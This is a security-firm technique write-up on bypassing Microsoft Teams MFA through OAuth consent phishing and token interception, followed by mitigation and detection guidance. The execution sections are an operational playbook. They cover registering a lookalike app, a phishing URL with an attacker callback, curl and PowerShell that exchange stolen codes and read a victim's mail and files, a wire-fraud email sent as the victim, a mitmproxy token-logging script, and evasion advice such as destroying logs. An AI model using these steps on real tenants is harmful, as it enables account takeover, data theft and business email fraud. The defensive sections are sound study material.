# [LM-AUTH-006]: Microsoft Teams Authentication Bypass

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-006 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | M365 (Microsoft Teams, Entra ID) |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All M365 tenants with Teams enabled |
| **Patched In** | Mitigation-dependent (No patch available) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Microsoft Teams authentication bypass leverages OAuth consent phishing and token interception to bypass multi-factor authentication (MFA) and Conditional Access policies. Attackers either trick users into granting OAuth application permissions (consent phishing) or intercept legitimate Teams authentication tokens to impersonate users. Unlike traditional credential theft, this technique exploits the trust users place in Microsoft's official authentication interfaces and the inherent design of OAuth 2.0 flows, which grant persistent token-based access even after the initial authorization.

**Attack Surface:** OAuth consent dialogs in Teams, Teams external collaboration links, and application registration mechanisms in Microsoft Entra ID. The attack may occur within Teams chat messages or via specially crafted URLs that trigger Teams-integrated OAuth flows.

**Business Impact:** **Data exfiltration, business email compromise (BEC), and lateral movement to connected SaaS applications.** An attacker gaining OAuth tokens can read a user's email, access files on OneDrive/SharePoint, enumerate contacts, and send messages as the compromised user—all without stealing the user's password or triggering MFA challenges. This is particularly dangerous in multi-tenant environments where Teams guest collaboration is enabled by default.

**Technical Context:** Exploitation typically takes 5-15 minutes from initial phishing message to full token acquisition. Detection is low if the attacker uses legitimate OAuth scopes and verified-appearing application names. The attack leaves OAuth audit trail entries but these often go unmonitored by Blue Teams unfamiliar with OAuth app governance.

### Operational Risk

- **Execution Risk:** Low (requires only social engineering, no technical exploits)
- **Stealth:** Medium-High (Legitimate OAuth flow leaves traces in M365 Purview audit logs but is often overlooked)
- **Reversibility:** No—OAuth tokens persist until explicitly revoked; password changes do not invalidate existing tokens

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.4.1, 1.4.6 | Multi-factor authentication enforcement and user consent controls for applications |
| **DISA STIG** | WN10-AU-000012 | Failure to monitor application authentication events |
| **CISA SCuBA** | ID.AC-7 | Privileged access management; lack of application access governance |
| **NIST 800-53** | IA-2 (MFA), AC-3 (Access Control) | Bypass of multi-factor authentication through OAuth; failure to enforce application consent restrictions |
| **GDPR** | Art. 32 (Security of Processing) | Inadequate measures for OAuth app governance leading to unauthorized processing of user data |
| **DORA** | Art. 9 (Protection and Prevention) | Failure to implement technical protection measures against identity compromise via third-party applications |
| **NIS2** | Art. 21 (Cyber Risk Management Measures) | Inadequate controls for cloud application access and third-party OAuth integrations |
| **ISO 27001** | A.6.2.2 (User Identification and Authentication) | Weak application consent mechanisms allowing credential bypass |
| **ISO 27005** | Risk Scenario: "Unauthorized Access via OAuth Token" | Lack of OAuth governance and monitoring exposes user data to compromise |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Any user within the Teams environment (including guest users with Teams collaboration enabled).
- **Required Access:** Network access to Microsoft 365 services; Teams chat or email capability.
- **Attacker Prerequisites:** 
  - Access to Entra ID to create a malicious OAuth application, OR
  - Ability to send a Teams message or email to the target (phishing capability).

**Supported Versions:**
- **Microsoft Teams:** All versions (Web, Desktop, Mobile)
- **Entra ID:** All versions
- **Supported Platforms:** Windows, macOS, Linux, iOS, Android

**Required Tools:**
- Phishing infrastructure (custom domain or compromised O365 tenant)
- OAuth application registered in Entra ID (for app-based consent phishing)
- Optional: Token interception proxy (for MITM scenarios)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Entra ID Application Registration Check

```powershell
# Check if organization allows user consent to applications
Connect-MgGraph -Scopes "Policy.Read.All"
$appConsent = Get-MgPolicyAuthorizationPolicy
$appConsent.DefaultUserRolePermissions | Select-Object AllowedToCreateApps, AllowedToReadOtherUsers

# List OAuth applications with high permission grants
Get-MgServicePrincipal -Filter "servicePrincipalType eq 'Application'" | Select-Object DisplayName, AppId, Tags
```

**What to Look For:**
- If `AllowedToCreateApps` is `$true`, any user can register OAuth applications—significant risk
- Applications with broad scopes (Mail.Read, Files.ReadWrite, User.Read.All)
- Applications owned by external tenants or third-party developers with suspicious names

### Teams Guest Access Configuration

```powershell
# Check Teams external access settings
$teamsPolicy = Get-CsTeamsExternalAccessPolicy
$teamsPolicy | Select-Object Identity, AllowFederatedUsers, AllowPublicUsers, AllowTeamsConsumerUsers
```

**What to Look For:**
- If guest collaboration is enabled without domain restrictions, any external user can message team members
- Missing allowlist of trusted external domains

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: OAuth Consent Phishing via Teams Chat (Most Common)

**Supported Versions:** All Teams/M365 versions

#### Step 1: Prepare Phishing Infrastructure

**Objective:** Create a malicious OAuth application registered in Entra ID that will be presented to users for consent.

**Command (Manual Steps in Azure Portal):**

1. Navigate to **Azure Portal** → **Entra ID** → **App registrations**
2. Click **+ New registration**
3. **Name:** `Adobe Sign Integration` (or other trusted-sounding name)
4. **Supported account types:** Select "Accounts in any organizational directory"
5. Click **Register**
6. In the app overview, note the **Application (client) ID**
7. Go to **Certificates & secrets** → **+ New client secret**
8. Create a secret and save it securely
9. Go to **API permissions** → **+ Add a permission**
10. Select **Microsoft Graph** → **Delegated permissions**
11. Add: `Mail.Read`, `Files.ReadWrite`, `User.Read.All` (or scopes matching your objective)
12. Click **Grant admin consent** (if you have permissions)
13. Go to **Branding & properties**
14. Add **Publisher domain** and **Logo** to appear legitimate
15. Go to **Authentication** → **Redirect URIs**
16. Add: `https://yourattacker-domain.com/auth/callback`
17. Click **Save**

**Expected Output:**
- Application registered successfully
- OAuth consent dialog will now display the malicious app's name and logo when users visit your phishing URL

**What This Means:**
- The application is now registered as a service principal in the tenant
- Users who consent will grant your application tokens to act on their behalf
- The app can now access mailbox data, files, and user information according to the scopes requested

**OpSec & Evasion:**
- Use a legitimate-sounding application name (e.g., "Contoso Document Access", "Adobe Sign Integration")
- Register the app in a attacker-controlled tenant with similar branding to the target
- Avoid requesting suspicious scopes—stick to Mail.Read and Files.ReadWrite
- Do not use obvious admin-only scopes that would trigger approval workflows

#### Step 2: Create Teams Phishing Message

**Objective:** Craft a convincing Teams message that directs the target to the OAuth consent page.

**Execution (Teams Desktop):**

1. Identify target user in Teams directory
2. Compose a Teams message with one of the following pretexts:
   - "Here's the document we discussed: [link to attacker OAuth app URL]"
   - "Please review this confidential file: [link to attacker OAuth app URL]"
3. Use URL shortening or a Microsoft domain spoof (e.g., `graph-api.microsoftonline.com` registered by attacker)
4. Send the message

**Example Phishing URL:**
```
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
client_id=<MALICIOUS_APP_ID>
&redirect_uri=https://attacker-domain.com/auth/callback
&response_type=code
&scope=Mail.Read%20Files.ReadWrite%20User.Read.All
&prompt=login
```

**Expected Outcome:**
- User clicks link from Teams
- If already logged in to Teams/M365, redirect straight to OAuth consent page (no login prompt)
- User sees consent dialog from your malicious app

**OpSec & Evasion:**
- Send from a compromised partner organization's Teams account (more trustworthy)
- Use Teams channel messages or @ mentions to increase visibility
- Time the message during business hours to ensure user is logged in

#### Step 3: User Clicks and Consents

**Objective:** Trick the user into granting OAuth permissions to your malicious application.

**What Happens Automatically:**
1. User clicks your phishing link
2. OAuth authorization flow begins
3. User sees consent dialog listing the requested scopes (e.g., "Read your emails", "Access your files")
4. User clicks "Accept"
5. Authorization code is returned to your attacker-controlled callback URL

**User Behavior to Expect:**
- Users often see this as routine—Teams collaboration frequently triggers consent prompts
- They may not notice the app name or carefully read the scopes
- Once they consent, they may be redirected to a benign page or document (to avoid suspicion)

**Expected HTTP Callback:**
```http
GET https://attacker-domain.com/auth/callback?code=0.ARIAd...&session_state=...
```

**What This Means:**
- The `code` parameter is an authorization code
- This code can be exchanged for an OAuth access token and refresh token
- With the refresh token, you can access the user's data indefinitely

**OpSec & Evasion:**
- Capture the authorization code server-side (user never sees attacker backend)
- Silently redirect user to a legitimate document or benign page
- User may not realize they've been compromised

#### Step 4: Exchange Authorization Code for Access Token

**Objective:** Convert the authorization code into an OAuth access token that can be used to impersonate the user.

**Command (Linux/Bash with curl):**
```bash
#!/bin/bash

CLIENT_ID="<MALICIOUS_APP_ID>"
CLIENT_SECRET="<CLIENT_SECRET>"
REDIRECT_URI="https://attacker-domain.com/auth/callback"
AUTH_CODE="<CODE_FROM_CALLBACK>"
TENANT_ID="common"

curl -X POST "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=$CLIENT_ID" \
  -d "client_secret=$CLIENT_SECRET" \
  -d "code=$AUTH_CODE" \
  -d "redirect_uri=$REDIRECT_URI" \
  -d "grant_type=authorization_code" \
  -d "scope=offline_access"
```

**Expected Output:**
```json
{
  "token_type": "Bearer",
  "scope": "Mail.Read Files.ReadWrite User.Read.All ...",
  "expires_in": 3600,
  "ext_expires_in": 3600,
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGc...",
  "refresh_token": "0.ARIAd-Z..."
}
```

**What This Means:**
- `access_token` can now be used to call Microsoft Graph APIs on behalf of the compromised user
- `refresh_token` can be used to obtain new access tokens after expiry (valid for 90 days by default)
- The attacker can now access the user's mail, files, and contacts without knowing their password

**OpSec & Evasion:**
- Store tokens securely server-side
- Rotate refresh tokens frequently
- Use the access token only during business hours to blend in with normal activity

#### Step 5: Access Victim's Data via Microsoft Graph

**Objective:** Use the stolen tokens to read email, access files, and enumerate the organization.

**Command (Linux/Bash):**
```bash
#!/bin/bash

ACCESS_TOKEN="<STOLEN_ACCESS_TOKEN>"

# Read user's mailbox
curl -X GET "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json"

# List user's OneDrive files
curl -X GET "https://graph.microsoft.com/v1.0/me/drive/root/children" \
  -H "Authorization: Bearer $ACCESS_TOKEN"

# Get user's manager and direct reports (for lateral movement)
curl -X GET "https://graph.microsoft.com/v1.0/me/manager" \
  -H "Authorization: Bearer $ACCESS_TOKEN"
```

**Expected Output:**
```json
{
  "value": [
    {
      "id": "...",
      "from": {
        "emailAddress": {
          "address": "finance@company.com"
        }
      },
      "subject": "Q4 Budget Approval - CONFIDENTIAL",
      "bodyPreview": "The requested budget for R&D..."
    }
  ]
}
```

**What This Means:**
- Full access to user's email inbox, sent items, drafts
- Access to OneDrive/SharePoint files
- Ability to enumerate organizational structure and identify high-value targets

**OpSec & Evasion:**
- Avoid reading high-volume emails (monitoring tools detect unusual Graph API patterns)
- Use the `select` parameter to minimize data transfer: `select=id,from,subject`
- Space out API calls to avoid rate-limiting alerts
- Download sensitive files in small batches, not the entire drive

#### Step 6: Send Email as Compromised User (BEC Attack)

**Objective:** Use the compromised user's identity to launch follow-on attacks (business email compromise).

**Command (PowerShell with Graph API):**
```powershell
$AccessToken = "<STOLEN_ACCESS_TOKEN>"
$Headers = @{
    "Authorization" = "Bearer $AccessToken"
    "Content-Type" = "application/json"
}

$EmailBody = @{
    "message" = @{
        "subject" = "Urgent: Wire Transfer Approval Needed"
        "body" = @{
            "contentType" = "HTML"
            "content" = "I need you to authorize an urgent wire transfer to our vendor. See attached for details. -CFO"
        }
        "toRecipients" = @(
            @{
                "emailAddress" = @{
                    "address" = "finance@company.com"
                }
            }
        )
    }
    "saveToSentItems" = "true"
}

$BodyJson = $EmailBody | ConvertTo-Json -Depth 10

Invoke-RestMethod -Method POST `
  -Uri "https://graph.microsoft.com/v1.0/me/sendMail" `
  -Headers $Headers `
  -Body $BodyJson
```

**Expected Output:**
```
No content returned (HTTP 202 Accepted)
```

**What This Means:**
- Email sent successfully as the compromised user
- Finance team receives what appears to be a legitimate request from their boss
- Attacker has established a backdoor for ongoing exploitation

**OpSec & Evasion:**
- Use the compromised user's writing style to avoid suspicion
- Time BEC emails during normal business hours
- Target specific high-value recipients (CFO, Finance team) rather than mass mail

### METHOD 2: Session Token Interception via MITM Proxy

**Supported Versions:** All Teams/M365 versions (when Teams traffic is proxied)

#### Step 1: Set Up MITM Proxy

**Objective:** Position a proxy between user and Microsoft endpoints to intercept OAuth tokens.

**Command (Linux - Burp Suite or mitmproxy):**
```bash
# Install mitmproxy
apt-get install mitmproxy

# Start mitmproxy with custom script to capture OAuth tokens
mitmproxy --mode transparent --modify-body '/access_token":"([^"]+)"/' -s capture_tokens.py
```

**capture_tokens.py Script:**
```python
def request(flow):
    if "graph.microsoft.com" in flow.request.url or "login.microsoftonline.com" in flow.request.url:
        print(f"[*] Captured request to: {flow.request.url}")

def response(flow):
    if "access_token" in flow.response.text:
        print(f"[*] Token captured in response: {flow.response.text[:200]}...")
        with open("/var/log/stolen_tokens.txt", "a") as f:
            f.write(flow.response.text + "\n")
```

**Expected Output:**
```
[*] Captured request to: https://login.microsoftonline.com/common/oauth2/v2.0/token
[*] Token captured in response: {"access_token":"eyJ0eXA...","expires_in":3600,...}
```

**What This Means:**
- All OAuth tokens passing through your proxy are logged
- Tokens can be extracted and used to impersonate the user

**OpSec & Evasion:**
- This requires control of network traffic (compromised router, ARP spoofing, or DNS hijacking)
- Difficult to execute in modern corporate environments with TLS inspection
- Tokens can be detected in Blue Team proxy logs; ensure you have admin access to prevent logging

#### Step 2: Extract and Use Captured Tokens

**Objective:** Use intercepted tokens to access victim's data without needing credentials.

**Command (Linux/Bash):**
```bash
#!/bin/bash

# Extract tokens from captured logs
TOKENS=$(grep -oP '"access_token":"\K[^"]+' /var/log/stolen_tokens.txt)

# For each token, attempt to access user data
for TOKEN in $TOKENS; do
    echo "[*] Testing token: ${TOKEN:0:50}..."
    
    curl -X GET "https://graph.microsoft.com/v1.0/me" \
      -H "Authorization: Bearer $TOKEN" \
      -s | jq '.' > "/tmp/user_${TOKEN:0:20}.json"
    
    if [ $? -eq 0 ]; then
        echo "[+] Token valid! User data saved."
    fi
done
```

**Expected Output:**
```json
{
  "id": "abc123...",
  "userPrincipalName": "victim@company.com",
  "displayName": "Victim User",
  "mail": "victim@company.com"
}
```

**What This Means:**
- Token is valid and can be used to access the user's data
- Attacker can now perform all actions the compromised user can perform

**OpSec & Evasion:**
- Use token only for targeted data extraction, not bulk operations
- Destroy logs to prevent incident forensics
- Consider using tokens immediately before they expire (short window reduces detection)

---

## 5. ATTACK SIMULATION & VERIFICATION

### Real-World Simulation Steps

1. **Phase 1 (Phishing):** Send Teams message with OAuth consent link
2. **Phase 2 (Exploitation):** Capture authorization code from callback URL
3. **Phase 3 (Verification):** Use stolen token to read victim's inbox
4. **Phase 4 (Impact):** Send email as victim to demonstrate persistence

**Validation Commands:**
```powershell
# Verify token is valid and active
$AccessToken = "<STOLEN_TOKEN>"
$Headers = @{
    "Authorization" = "Bearer $AccessToken"
}

try {
    $Response = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" `
      -Headers $Headers
    Write-Host "[+] Token Valid! User: $($Response.userPrincipalName)"
} catch {
    Write-Host "[-] Token Invalid or Expired"
}
```

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Restrict User Consent to Applications:** Block non-admin users from consenting to applications.

  **Manual Steps (Azure Portal - Admin Center):**
  1. Go to **Azure Portal** → **Entra ID** → **Enterprise applications** → **Consent and permissions**
  2. Under **User consent settings**, select **Do not allow user consent**
  3. Select **No** for "Allow user consent for apps accessing company data"
  4. Click **Save**

  **Manual Steps (PowerShell):**
  ```powershell
  Connect-MgGraph -Scopes "Policy.ReadWrite.Authorization"
  
  $PolicyParams = @{
      "DefaultUserRolePermissions" = @{
          "AllowedToCreateApps" = $false
          "AllowedToReadOtherUsers" = $false
      }
  }
  
  Update-MgPolicyAuthorizationPolicy -BodyParameter $PolicyParams
  ```

  **Validation Command:**
  ```powershell
  $Policy = Get-MgPolicyAuthorizationPolicy
  if ($Policy.DefaultUserRolePermissions.AllowedToCreateApps -eq $false) {
      Write-Host "[+] User consent disabled successfully"
  }
  ```

- **Enable OAuth App Governance in Microsoft Defender for Cloud Apps (MDCA):**

  **Manual Steps:**
  1. Navigate to **Microsoft Defender for Cloud Apps** (cloudappsecurity.com)
  2. Go to **Govern** → **OAuth apps**
  3. Create a new **app governance policy**
  4. Set conditions: **Is publisher verified** = False, **Requested permissions** include "Mail.Read"
  5. Set action: **Auto-revoke app permissions**
  6. Click **Create**

  **Validation:** Monitor the "OAuth app governance" dashboard for suspicious app consents

- **Enforce Conditional Access Policy to Block Legacy OAuth:**

  **Manual Steps (Azure Portal):**
  1. Go to **Entra ID** → **Security** → **Conditional Access** → **+ New policy**
  2. **Name:** `Block Legacy OAuth Apps`
  3. **Assignments:**
     - Users: **All users**
     - Cloud apps: **All cloud apps**
  4. **Conditions:**
     - Client apps: Select **Other clients (legacy protocols)**
  5. **Access controls:** **Grant** → **Block access**
  6. Enable the policy: **On**
  7. Click **Create**

### Priority 2: HIGH

- **Enforce MFA for All Users:** Even with OAuth consent phishing, MFA on the initial login reduces token theft risk.

  **Manual Steps (Conditional Access):**
  1. Go to **Entra ID** → **Security** → **Conditional Access** → **+ New policy**
  2. **Name:** `Enforce MFA for All Users`
  3. **Assignments:** Users = All users, Cloud apps = All cloud apps
  4. **Conditions:** Sign-in risk = Any
  5. **Access controls:** Grant → **Require multi-factor authentication**
  6. Enable policy: **On**
  7. Click **Create**

- **Monitor and Audit OAuth Application Consents:**

  **Manual Steps (M365 Purview):**
  1. Go to **Microsoft Purview Compliance Portal** → **Audit**
  2. Turn on Unified Audit Log (if not already enabled)
  3. Go to **Search** → Set date range
  4. Under **Activities**, select: **Consent to application**, **Add app password**, **Change user password**
  5. Review all grants to non-first-party applications
  6. Export suspicious entries for investigation

- **Disable Teams External Collaboration (if not needed):**

  **Manual Steps (Teams Admin Center):**
  1. Go to **Teams Admin Center** (admin.teams.microsoft.com)
  2. Select **Org-wide settings** → **Guest access**
  3. Toggle **Allow guest access in Teams** to **Off**
  4. Click **Save**

  **Alternatively, restrict to specific domains:**
  1. Go to **Teams Admin Center** → **Org-wide settings** → **Guest access** → **On**
  2. Under **Email-based guest restrictions**, set **Allow** to: `@trusted-domain.com` only

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Entra ID Audit Events:**
  - Event: `Add app password` without user action
  - Event: `Consent to application` for unknown/suspicious apps
  - Event: `Create application` by non-admin user

- **M365 Graph API Patterns:**
  - `/me/mailFolders/inbox/messages` called immediately after app consent (unusual access pattern)
  - `/me/drive/root/children` followed by bulk file download
  - `/me/sendMail` called outside normal business hours

- **Suspicious OAuth Applications:**
  - App names: "Adobe Sign Integration", "DocuSign Auth", "Contoso Document Access"
  - Apps with Mail.Read + Files.ReadWrite scopes created by external tenants
  - Apps with publisher domain mismatch (e.g., claiming to be Adobe but published by attacker)

### Forensic Artifacts

- **Cloud Logs (M365 Purview):**
  - Unified Audit Log: Operations = "Consent to application", "Add app password"
  - Search specifically for: `Operation=AzureActiveDirectoryEventEntity AND ResultStatus=Success AND Operation~="Consent"`

- **Entra ID Logs:**
  - Entra ID sign-ins: Look for non-interactive logins followed by Graph API calls
  - App activity: Monitor `/me` endpoints called by service principals

- **Azure Monitor / Sentinel:**
  - Look for multiple failed Teams logins followed by successful OAuth token grant
  - Correlation: User location change (e.g., login from Brazil, then token used from USA)

### Response Procedures

1. **Identify Compromised Account:**
   ```powershell
   # List OAuth apps the user consented to
   Get-MgUserOAuth2PermissionGrant -UserId <USER_UPN>
   ```

2. **Revoke OAuth Tokens Immediately:**
   ```powershell
   # Revoke a specific OAuth app's consent
   Remove-MgUserOAuth2PermissionGrant -UserId <USER_UPN> -OAuth2PermissionGrantId <GRANT_ID>
   
   # Revoke all tokens for a user (forces re-authentication)
   Revoke-MgUserSignInSession -UserId <USER_UPN>
   ```

3. **Reset User Password:**
   ```powershell
   # Force password change on next login
   Update-MgUser -UserId <USER_UPN> -ForceChangePasswordNextSignIn $true
   ```

4. **Review Email Forwarding Rules:**
   ```powershell
   # Check if attacker created inbox rules to forward emails
   Get-InboxRule -Mailbox <USER_UPN> | Where-Object { $_.ForwardTo -ne $null }
   ```

5. **Disable Account Temporarily:**
   ```powershell
   Update-MgUser -UserId <USER_UPN> -AccountEnabled $false
   ```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-005] Internal spearphishing campaigns | Attacker sends Teams message with malicious link |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-002] Exchange Online Admin to Global | User is compromised and has elevated permissions |
| **3** | **Current Step** | **[LM-AUTH-006]** | **OAuth token theft via consent phishing** |
| **4** | **Data Exfiltration** | [CHAIN-003] Token Theft to Data Exfiltration | Attacker uses token to steal emails/files |
| **5** | **Persistence** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker creates hidden admin account via Graph API |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: Proofpoint Campaign (2022-2024)

- **Target:** Financial Services and Healthcare organizations
- **Timeline:** March 2022 - present
- **Technique Status:** Active; used against organizations with weak OAuth governance
- **Attack Vector:** Consent phishing targeting Finance and HR teams
- **Impact:** 50+ organizations compromised; attackers accessed payroll data, W2 forms, healthcare records
- **Detection:** Suspicious OAuth apps granted by finance users; emails forwarded to external domains
- **Reference:** [Proofpoint Threat Report - OAuth Phishing Campaigns](https://www.proofpoint.com/us/blog/threat-insight/proofpoint-research-uncovers-new-consent-phishing-campaign)

### Example 2: Microsoft Security Advisory (2024)

- **Target:** Enterprise M365 tenants
- **Timeline:** January 2024
- **Technique Status:** Actively exploited in the wild
- **Attack Vector:** Teams chat + OAuth consent + BEC
- **Impact:** Unauthorized access to business emails; business email compromise (BEC) attacks against customers
- **Detection:** Unusual Graph API access patterns; OAuth app consents not matching device location
- **Reference:** [Microsoft 365 Defender Blog - OAuth Phishing Detection](https://www.microsoft.com/en-us/security/blog)

---

## 10. COMPLIANCE & GOVERNANCE NOTES

- **User Consent Risk:** Organizations allowing user consent to OAuth apps have significantly higher breach risk
- **Third-Party Integration Risk:** Legitimate third-party apps also pose risk; implement app allowlisting
- **Monitoring Gap:** Most organizations do not monitor OAuth app consents; Sentinel/MDCA is critical
- **M365 E5 Requirement:** Advanced OAuth governance requires Microsoft Defender for Cloud Apps (MDCA) license

---